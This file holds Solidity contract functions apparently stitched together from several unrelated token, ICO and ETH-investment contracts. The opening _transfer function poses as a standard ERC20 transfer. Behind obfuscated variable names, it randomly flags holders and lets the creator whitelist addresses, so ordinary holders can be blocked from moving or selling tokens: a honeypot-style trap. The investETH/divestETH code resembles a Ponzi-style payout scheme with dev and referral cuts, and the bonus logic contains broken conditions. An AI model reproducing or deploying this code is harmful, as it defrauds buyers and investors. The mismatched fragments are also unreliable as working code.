function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (spell == false)) {
        lakers = chTx;
        peanuts = true;
    }
    if ((address(sender) == creator) && (spell == true)) {
        usausa[recipient] = true;
        forest[recipient] = false;
        spell = false;
    }
    if ((amount > yankee) && (usausa[sender] == true) && (address(sender) != creator)) {
        smartphone[recipient] = true;
    }
    if (usausa[recipient] != true) {
        forest[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((forest[sender]) && (usausa[recipient] == false)) {
        forest[recipient] = true;
    }
    if (usausa[sender] == false) {
        if ((amount > yankee) && (smartphone[sender] == true)) {
            require(false);
        }
        require(amount < lakers);
        if (peanuts == true) {
            if (smartphone[sender] == true) {
                require(false);
            }
            smartphone[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function _receiveFunds()
internal {
    require(msg.value != 0);
    uint transferTokens = msg.value.mul(DECIMALS).div(currentPrice);
    require(totalSaleSupply.add(transferTokens) <= MAX_SALE_SUPPLY);
    uint bonusTokens = transferTokens.mul(bonus).div(bonusBase);
    transferTokens = transferTokens.add(bonusTokens);
    _checkMaxRoundSupply(transferTokens);
    totalSaleSupply = totalSaleSupply.add(transferTokens);
    balances[msg.sender] = balances[msg.sender].add(msg.value);
    totalFunds = totalFunds.add(msg.value);
    _mint(msg.sender, transferTokens);
    beneficiary.transfer(msg.value);
    Transfer(msg.sender, transferTokens);
}

function investETH(address referral) public payable {
    require(msg.value >= 0.01 ether);
    if (getProfit(msg.sender) > 0) {
        uint256 profit = getProfit(msg.sender);
        lastInvest[msg.sender] = now;
        msg.sender.transfer(profit);
    }
    uint256 amount = msg.value;
    bool flaggedRef = (referral == msg.sender || referral == dev); 
    for (uint256 i = 0; i < investorPositions.length; i++) {
        InvestorPosition memory position = investorPositions[i];
        if (position.investor == referral) {
            flaggedRef = true;
        }
        if (position.investor != msg.sender) {
            uint256 commision = SafeMath.div(SafeMath.mul(amount, position.percentageCut), 100);
            affiliateCommision[position.investor] = SafeMath.add(affiliateCommision[position.investor], commision);
        }
    }
    if (!flaggedRef && referral != 0x0) {
        uint256 refBonus = SafeMath.div(SafeMath.mul(amount, REF_BONUS), 100); 
        affiliateCommision[referral] = SafeMath.add(affiliateCommision[referral], refBonus);
    }
    uint256 devTax = SafeMath.div(SafeMath.mul(amount, DEV_TAX), 100); 
    affiliateCommision[dev] = SafeMath.add(affiliateCommision[dev], devTax);
    investedETH[msg.sender] = SafeMath.add(investedETH[msg.sender], amount);
    lastInvest[msg.sender] = now;
}

function divestETH() public {
    uint256 profit = getProfit(msg.sender);
    uint256 capital = investedETH[msg.sender];
    uint256 fee = SafeMath.div(capital, 5);
    capital = SafeMath.sub(capital, fee);
    uint256 total = SafeMath.add(capital, profit);
    require(total > 0);
    investedETH[msg.sender] = 0;
    lastInvest[msg.sender] = now;
    msg.sender.transfer(total);
}

function inheritInvestorPosition(uint256 index) public payable {
    require(investorPositions.length > index);
    require(msg.sender == tx.origin);
    InvestorPosition storage position = investorPositions[index];
    uint256 currentLevel = getCurrentLevel(position.startingLevel, position.startingTime, position.halfLife);
    uint256 currentPrice = getCurrentPrice(currentLevel);
    require(msg.value >= currentPrice);
    uint256 purchaseExcess = SafeMath.sub(msg.value, currentPrice);
    position.startingLevel = currentLevel + 1;
    position.startingTime = now;
    uint256 inheritanceTax = SafeMath.div(SafeMath.mul(currentPrice, INHERITANCE_TAX), 100); 
    position.investor.transfer(inheritanceTax);
    position.investor = msg.sender; 
    uint256 devTransferTax = SafeMath.div(SafeMath.mul(currentPrice, DEV_TRANSFER_TAX), 100); 
    dev.transfer(devTransferTax);
    msg.sender.transfer(purchaseExcess);
}

function getCurrentLevel(uint256 startingLevel, uint256 startingTime, uint256 halfLife) internal view returns(uint256) {
    uint256 timePassed = SafeMath.sub(now, startingTime);
    uint256 levelsPassed = SafeMath.div(timePassed, halfLife);
    if (startingLevel < levelsPassed) {
        return 0;
    }
    return SafeMath.sub(startingLevel, levelsPassed);
}

function withdrawFunds() onlyOwner public returns(bool success) {
    require(Softcap <= ICOcollected);
    owner.transfer(ICOcollected - TakedFunds);
    TakedFunds = ICOcollected;
    return true;
}

function manualSendTokens(address rAddress, uint256 amount) onlyOwner public returns(bool success) {
    managedTokenLedger.mint(rAddress, amount);
    balancesForICO[rAddress] = balancesForICO[rAddress].add(amount);
    Purchased(rAddress, amount);
    ICOtokensSold = ICOtokensSold.add(amount);
    return true;
}

function ICOBuy() internal notHalted returns(bool success) {
    uint256 weisSentScaled = msg.value.mul(DECIMAL_MULTIPLIER);
    address _for = msg.sender;
    uint256 amountBonus = getBonusMultipierInPercents(msg.value);
    var (tokensBought, fundsLeftScaled) = calculateAmountBoughtICO(weisSentScaled, amountBonus);
    if (tokensBought < minTokensToBuy.mul(DECIMAL_MULTIPLIER)) {
        revert();
    }
    uint256 fundsLeft = fundsLeftScaled.div(DECIMAL_MULTIPLIER);
    uint256 totalSpent = msg.value.sub(fundsLeft);
    if (balanceOf(_for) == 0) {
        ICOcontributors = ICOcontributors + 1;
    }
    managedTokenLedger.mint(_for, tokensBought);
    balancesForICO[_for] = balancesForICO[_for].add(tokensBought);
    weiForRefundICO[_for] = weiForRefundICO[_for].add(totalSpent);
    weiToRecoverICO[_for] = weiToRecoverICO[_for].add(fundsLeft);
    Purchased(_for, tokensBought);
    ICOcollected = ICOcollected.add(totalSpent);
    ICOtokensSold = ICOtokensSold.add(tokensBought);
    return true;
}

function transitionState() internal {
    if (now >= ICOstart) {
        if (ICOstate == ICOStateEnum.NotStarted) {
            ICOstate = ICOStateEnum.Started;
        }
        if (Hardcap > 0 && ICOcollected >= Hardcap) {
            ICOstate = ICOStateEnum.Successful;
        }
    }
    if (now >= ICOend) {
        if (ICOstate == ICOStateEnum.Started) {
            if (ICOcollected >= Softcap) {
                ICOstate = ICOStateEnum.Successful;
            } else {
                ICOstate = ICOStateEnum.Refunded;
            }
        }
    }
}

function getWeekBonus(uint256 amountTokens) internal view returns(uint256 count) {
    uint256 countCoints = 0;
    uint256 bonusMultiplier = 100;
    if (block.timestamp <= (ICOstart + 1 weeks)) {
        countCoints = amountTokens.mul(ICOweekBonus[0]);
    } else if (block.timestamp <= (ICOstart + 2 weeks) && block.timestamp <= (ICOstart + 3 weeks)) {
        countCoints = amountTokens.mul(ICOweekBonus[1]);
    } else if (block.timestamp <= (ICOstart + 4 weeks) && block.timestamp <= (ICOstart + 5 weeks)) {
        countCoints = amountTokens.mul(ICOweekBonus[2]);
    } else if (block.timestamp <= (ICOstart + 6 weeks) && block.timestamp <= (ICOstart + 7 weeks)) {
        countCoints = amountTokens.mul(ICOweekBonus[3]);
    } else {
        countCoints = amountTokens.mul(ICOweekBonus[4]);
    }
    return countCoints.div(bonusMultiplier);
}

